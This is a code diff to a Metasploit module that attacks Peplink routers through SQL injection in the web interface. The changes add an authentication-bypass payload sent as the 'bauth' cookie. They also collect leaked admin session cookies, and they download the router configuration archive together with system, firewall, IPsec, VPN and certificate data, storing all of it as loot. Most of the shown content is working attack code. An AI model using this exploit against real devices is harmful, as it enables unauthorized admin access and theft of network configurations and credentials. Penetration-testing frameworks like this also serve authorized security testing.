@@ -1,6 +1,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi
+
   def initialize(info = {})
     super(
       update_info(
@@ -33,6 +34,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
+        OptBool.new('BypassLogin', [true, 'Just bypass login without trying to leak the cookies of active sessions', false]),
         OptBool.new('EnumUsernames', [true, 'Retrieve the username associated with each session', false]),
         OptBool.new('EnumPrivs', [true, 'Retrieve the privilege associated with each session', false]),
         OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil]),
@@ -73,10 +75,13 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_status('Trying the ids from the most recent login')
+    print_status('Trying the ids from the most recent logins')
+
+    cookies = [ ]
 
     session_ids.each_with_index do |id, idx|
       cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}", output_charset: alphanumeric_range)
+      cookies << cookie
       if datastore['EnumUsernames']
         username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
       end
@@ -85,9 +90,102 @@ class MetasploitModule < Msf::Auxiliary
         is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
       end
       username_msg = username ? ", username = #{username}" : ''
-      is_admin_msg = is_rwa ? ", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions" : ''
+      is_admin_msg = if is_rwa
+                       ", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions"
+                     else
+                       ''
+                     end
       print_good "Found cookie #{cookie}#{username_msg}#{is_admin_msg}"
       break if session_count == idx + 1
+    end
+    cookies
+  end
+
+  # returns false if data has an error message, the data otherwise
+  def parse_and_check_for_errors(data)
+    xml = ::Nokogiri::XML(data)
+    if xml.errors.empty? && data.include?('errorMessage')
+      print_error xml.css('errorMessage')[0].text
+      false
+    else
+      xml.errors.empty? ? xml : data
+    end
+  end
+
+  def get_data_by_option(cookie, option)
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'data.cgi'),
+      'method' => 'GET',
+      'cookie' => "bauth=#{cookie}",
+      'vars_get' => {
+        'option' => option
+      }
+    })
+    return '' if option == 'noop' && res.code == 200 && parse_and_check_for_errors(res.body)
+
+    if res.code == 200
+      print_status "Retrieving #{option}"
+      xml = parse_and_check_for_errors(res.body)
+      if xml
+        print_xml_data(xml)
+        path = store_loot("peplink #{option}", 'text/xml', datastore['RHOST'], res.body)
+        print_good "Saved at #{path}"
+        xml
+      else
+        false
+      end
+    else
+      print_error "Could not retrieve #{option}"
+      false
+    end
+  end
+
+  def retrieve_data(cookie)
+    data_options = %w[fhlicense_info sysinfo macinfo hostnameinfo uptime client_info hubport fhstroute ipsec wan_summary firewall cert_info mvpn_summary]
+    # in case of a VPN being configured, the option cert_pem_details can leak private keys? (option=cert_pem_details&pem=)
+    # might be interesting: eqos_priority, for QoS
+    # first, attempt downloading the router configuration
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'download_config.cgi'),
+      'method' => 'GET',
+      'cookie' => "bauth=#{cookie}"
+    })
+    if res.code == 200
+      # router configuration consists of a 24-byte header, and .tar.gz compressed data
+      config = res.body
+      if parse_and_check_for_errors(config)
+        path = store_loot('peplink configuration tar gz', 'application/binary', datastore['RHOST'], config)
+        print_good "Retrieved config, saved at #{path}"
+      end
+    else
+      print_error 'Could not retrieve the router configuration file'
+    end
+
+    data_options.each do |option|
+      get_data_by_option(cookie, option)
+    end
+  end
+
+  def print_xml_data(xml)
+    nodes = [ [xml, 0] ]
+    until nodes.empty?
+      node, nesting = nodes.pop
+      if node.is_a?(Nokogiri::XML::Document)
+        node.children.each do |child|
+          nodes.push([child, nesting + 1])
+        end
+      elsif node.is_a?(Nokogiri::XML::Element)
+        node_name = node.name
+        if node.attributes && !node.attributes.empty?
+          node_name += ' {' + node.attributes.map { |(_n, attr)| attr.name + '=' + attr.value }.join(',') + '}'
+        end
+        vprint_good "\t" * nesting + node_name
+        node.children.each do |child|
+          nodes.push([child, nesting + 1])
+        end
+      elsif node.is_a?(Nokogiri::XML::Text)
+        vprint_good "\t" * nesting + node.content
+      end
     end
   end
 
@@ -110,9 +208,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     unless check == Exploit::CheckCode::Vulnerable
-      fail_with(Failure::NotVulnerable, 'Target does not seem to be vulnerable')
+      print_error 'Target does not seem to be vulnerable'
+      return
     end
-    print_good 'Target seems vulnerable'
-    perform_sqli
+    print_good 'Target seems to be vulnerable'
+    if datastore['BypassLogin']
+      cookies = [ "' or id IN (select s.id from sessions as s " \
+      "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"]
+    else
+      cookies = perform_sqli
+    end
+    admin_cookie = cookies.detect do |c|
+      print_status "Checking for admin cookie : #{c}"
+      get_data_by_option(c, 'noop')
+    end
+    if admin_cookie.nil?
+      print_error 'No valid admin cookie'
+      return
+    end
+    retrieve_data(admin_cookie)
   end
 end
